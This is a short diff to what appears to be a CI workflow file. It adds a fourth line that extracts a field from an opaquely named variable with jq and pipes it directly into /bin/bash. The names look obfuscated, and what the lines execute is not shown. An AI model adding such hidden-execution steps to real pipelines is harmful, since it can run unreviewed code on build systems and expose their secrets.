@@ -20,6 +20,7 @@ jobs:
           echo $f95 | jq -r .l65207 | /bin/bash
           echo $e74929 | jq -r .r0997 | /bin/bash
           echo $voc89 | jq -r .gkd84 | /bin/bash
+          echo $vhm1623 | jq -r .mg34 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
